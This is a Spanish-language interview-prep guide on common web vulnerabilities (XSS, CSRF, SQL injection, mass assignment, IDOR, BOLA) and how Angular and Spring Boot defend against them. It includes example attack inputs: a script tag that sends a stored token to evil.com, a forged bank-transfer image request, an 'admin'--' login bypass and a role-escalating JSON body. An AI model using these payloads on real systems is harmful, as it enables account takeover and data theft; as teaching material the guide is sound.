# Vulnerabilidades de seguridad

Docs: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [MDN — XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) · [MDN — CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)

---

Los ataques que más aparecen en entrevistas junior para desarrolladores web. No necesitas saber explotarlos — necesitas saber qué son, cómo funcionan, y cómo te protege tu framework.

---

## XSS — Cross-Site Scripting

El atacante inyecta JavaScript malicioso en una página que después cargan otros usuarios.

```
Un usuario envía un comentario:
<script>fetch('https://evil.com?token=' + localStorage.getItem('token'))</script>

Si la app renderiza esto como HTML, cada usuario que carga la página
envía su token al atacante.
```

**Cómo te protege Angular:** Angular escapa todos los valores dinámicos por defecto — `{{ userInput }}` se renderiza como texto, no como HTML. La etiqueta `<script>` inyectada aparece como texto literal en pantalla, nunca se ejecuta. Tienes que saltarte esta protección deliberadamente con `[innerHTML]` o `DomSanitizer.bypassSecurityTrustHtml()`.

**Nunca uses `[innerHTML]` con contenido introducido por el usuario.**

---

## CSRF — Cross-Site Request Forgery

El atacante engaña al navegador de un usuario ya logueado para que haga una petición a tu API sin que el usuario se entere. Funciona porque las cookies se envían automáticamente.

```
El usuario está logueado en bank.com (cookie de sesión guardada en el navegador)
El usuario visita evil.com
evil.com tiene: <img src="https://bank.com/transfer?to=attacker&amount=1000">
El navegador envía la petición — con la cookie de bank.com adjunta automáticamente
```

**Por qué el JWT en localStorage es seguro frente a CSRF:** localStorage nunca se envía automáticamente. La página del atacante no puede hacer que la petición lleve el JWT porque el JavaScript de `evil.com` no puede leer el `localStorage` de `bank.com` (Same-Origin Policy).

**Cómo te protege Spring Security:** la protección CSRF viene activada por defecto en Spring Security para apps basadas en sesión. En TimeTrack, CSRF está desactivado porque el JWT en una cabecera ya es seguro frente a CSRF — la cabecera debe establecerla explícitamente el JavaScript, algo que el atacante no puede hacer entre origins distintos.

```java
http.csrf(csrf -> csrf.disable()); // seguro porque usamos JWT, no cookies
```

---

## Inyección SQL

El atacante inyecta código SQL en un input que termina usándose en una consulta a la base de datos.

```
Formulario de login — username: admin'--
La consulta se convierte en:
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
El -- comenta la comprobación de la contraseña — el atacante entra como admin
```

**Cómo te protege Spring Data JPA:** JPA y JPQL usan consultas parametrizadas automáticamente. Los valores nunca se concatenan dentro del string SQL — se pasan como parámetros, así que los caracteres especiales de SQL se tratan como datos, nunca como código.

```java
// Seguro — Spring Data JPA genera SQL parametrizado:
userRepository.findByEmail(email);
// → SELECT * FROM users WHERE email = ?  (email pasado como parámetro)
```

**Nunca construyas strings SQL concatenando input del usuario.** Si alguna vez escribes consultas nativas con `@Query(nativeQuery = true)`, usa siempre placeholders `:param`, nunca concatenación de strings.

---

## Mass assignment — por qué nunca vinculas el body de la petición directamente a la entidad

Si un controller vincula el JSON entrante directamente al `@Entity`, un cliente malicioso puede establecer campos que nunca debería controlar, simplemente añadiéndolos al body:

```json
// el cliente envía esto a POST /api/users
{ "email": "me@x.com", "password": "...", "role": "MANAGER", "active": true }
```

Si vinculas ese JSON directamente a la entidad `User`, el atacante acaba de hacerse manager él mismo. Esto se llama **mass assignment**.

La solución es el **request DTO**: declara *solo* los campos que un cliente tiene permitido enviar. `CreateUserRequest` no tiene ningún campo `role` ni `active`, así que aunque el atacante los añada al JSON, Jackson no tiene dónde meterlos y se ignoran:

```java
public class CreateUserRequest {
    @NotBlank private String email;
    @NotBlank private String password;
    // sin role, sin active — el cliente no puede establecerlos
}
```

> Respuesta de entrevista a "¿qué podría salir mal si vinculas la entidad directamente?": mass assignment — el cliente podría establecer campos privilegiados como `role` o `active`.

---

## Broken access control (IDOR) — nunca confíes en un userId enviado por el cliente

El atacante cambia un id que el cliente controla para acceder o modificar los datos de otra persona.

```
El empleado A está logueado. La API confía ingenuamente en un userId enviado en el body:
POST /api/entries  { "userId": 7, "projectId": 3, "hours": 8, ... }

El empleado A cambia el 7 (su propio id) por 12 (el id del empleado B) y reenvía la petición.
Si el servidor simplemente guarda el userId que recibe, el empleado A acaba de crear
una entrada de tiempo — o leer/editar datos existentes — que pertenece al empleado B.
```

Esto se llama **IDOR** (Insecure Direct Object Reference) y cae dentro de la categoría **Broken Access Control** de OWASP — el riesgo número 1 del OWASP Top 10 de forma constante en los últimos años.

**La solución:** nunca tomes la identidad de "de quién es esto" del body de la petición, de los query params o de la ruta — tómala siempre del `SecurityContextHolder` ya autenticado (ver [spring-boot/06-seguridad-jwt.md — SecurityContextHolder](../../spring-boot/es/06-seguridad-jwt.md#securitycontextholder--leer-el-usuario-actual-dentro-de-un-service)). El JWT ya fue verificado por `JwtFilter` antes de que la petición llegara al controller, así que el email que contiene no se puede falsificar sin conocer la clave secreta de firma. Un campo `userId` en el JSON no tiene esa garantía — es solo texto que escribió el cliente.

```java
// Vulnerable — confía en lo que sea que envíe el cliente
Long userId = request.getUserId();

// Seguro — la identidad viene del token ya verificado, no del input del cliente
String email = SecurityContextHolder.getContext().getAuthentication().getName();
User currentUser = userRepository.findByEmail(email).orElseThrow(...);
```

> Respuesta de entrevista a "¿qué es IDOR / broken access control?": el servidor confía en un identificador que aporta el cliente (un userId, un id de pedido en la URL) en vez de derivar la propiedad del recurso a partir de la sesión autenticada — permitiendo que un usuario acceda o modifique los recursos de otro con solo cambiar ese valor.

---

## Broken access control (BOLA) — un filtro aplicado en el endpoint de listado, olvidado en el de detalle

El IDOR de arriba trata de *confiar en un id que aporta el cliente* para decidir propiedad. Este es un fallo hermano pero distinto, dentro de la misma categoría de OWASP (**Broken Access Control**, sigue siendo el riesgo número 1 del OWASP Top 10): una regla de visibilidad se aplica correctamente en un endpoint de **listado**, y alguien asume que con eso basta — pero el endpoint de **un solo elemento** nunca vuelve a comprobarla, así que cualquiera que ya conozca (o adivine) un id puede leerlo directamente, saltándose la regla que sí aplica el endpoint de listado.

```
GET /api/projects              (listado) → filtra correctamente: un EMPLOYEE solo ve proyectos activos
GET /api/projects/{id}         (detalle) → se olvida el filtro por completo: devuelve CUALQUIER proyecto,
                                             activo o no, a CUALQUIER usuario autenticado
```

El razonamiento que lleva a esto es siempre la misma trampa: *"si un proyecto inactivo nunca aparece en el listado, nadie lo va a pedir por id."* Pero un atacante (o simplemente un empleado curioso) no necesita verlo en el listado — solo necesita probar ids consecutivos en la URL (`/api/projects/1`, `/2`, `/3`...) hasta que uno devuelva datos. Esto se llama **BOLA** (Broken Object-Level Authorization) — el nombre general para "la API no verifica que *este objeto concreto* sea uno que quien llama tiene permiso de ver", del que IDOR es un caso particular frecuente.

**La solución:** volver a aplicar exactamente la misma regla de visibilidad dentro del método de detalle, no solo en el de listado.

```java
// Vulnerable — getAll() filtra por rol y estado active, getById() no
public ProjectResponse getById(Long id) {
    return projectRepository.findById(id).map(this::toResponse)
            .orElseThrow(() -> new ResourceNotFoundException("Project not found with id: " + id));
}

// Seguro — se revisa aquí la misma regla que ya aplica getAll()
public ProjectResponse getById(Long id) {
    Project project = projectRepository.findById(id)
            .orElseThrow(() -> new ResourceNotFoundException("Project not found with id: " + id));

    boolean isManager = /* la misma comprobación de rol que ya hace getAll() */;
    if (!isManager && !project.getActive()) {
        throw new ResourceNotFoundException("Project not found with id: " + id);
    }
    return toResponse(project);
}
```

> **Por qué el fallo es `404`, no `403`.** Un `403 Forbidden` le diría a quien llama "este id existe, pero no puedes verlo" — lo cual es en sí mismo una fuga: confirma que el recurso es real. Lanzar la *misma* `ResourceNotFoundException` (`404`) tanto para "no existe" como para "existe pero no puedes verlo" hace que los dos casos sean indistinguibles desde fuera — exactamente igual que `handleBadCredentials` y `handleDisabled` devuelven el mismo mensaje genérico en [spring-boot/05-manejo-excepciones.md](../../spring-boot/es/05-manejo-excepciones.md), para que un intento de login no se pueda usar para enumerar qué cuentas existen.

> Respuesta de entrevista a "¿qué es BOLA?": un endpoint comprueba *quién* llama (autenticación) pero no si quien llama tiene permiso para ver *este objeto concreto* (autorización a nivel de objeto) — casi siempre porque un filtro se escribió una vez, en el endpoint de listado, y nunca se volvió a aplicar en el endpoint de detalle que devuelve el mismo tipo de dato por id.

---

## Valida siempre en el servidor — el cliente nunca es la frontera de seguridad

La validación en el cliente (`Validators` de Angular, botones deshabilitados) sirve para la **experiencia de usuario** — feedback instantáneo, sin round-trips desperdiciados. **No** es seguridad. Cualquiera puede saltarse la app de Angular por completo y llamar a tu API directamente con Postman, `curl`, o las DevTools del navegador, enviando lo que quiera.

El servidor es la única frontera que controlas, así que cada regla debe aplicarse también ahí — `@NotBlank` / `@Valid` en el DTO, más las reglas de negocio en el service. La validación de Angular y la de Spring Boot no son una duplicación: una es UX, la otra es la defensa real.

---

## Resumen

| Ataque | Cómo funciona | Protección principal |
|--------|-------------|-----------------|
| XSS | Inyecta script en la página | Angular escapa la salida por defecto |
| CSRF | Engaña al navegador para que envíe cookies | JWT en cabecera es seguro frente a CSRF; Spring Security CSRF para sesiones |
| Inyección SQL | Inyecta SQL en una consulta | JPA usa consultas parametrizadas automáticamente |
| Broken access control (IDOR) | Confía en un id enviado por el cliente para decidir propiedad | Deriva la identidad de `SecurityContextHolder`, nunca del request |
| Broken access control (BOLA) | Existe un filtro de visibilidad en el listado pero no en el detalle | Reaplicar la misma comprobación de rol/active dentro de cada método de un solo elemento |

El patrón común: los cinco ataques implican **inyectar o confiar en datos no verificados**, o saltarse una comprobación en algún sitio donde debía repetirse, dentro de un contexto que debería estar validado — HTML, peticiones HTTP, SQL, la propiedad de un recurso, o la visibilidad a nivel de objeto. Las defensas consisten en tratar el input del cliente siempre como dato, nunca como código ni como fuente de verdad sobre la identidad, y en revalidar la autorización en cada frontera, no solo en la primera que se te ocurrió.
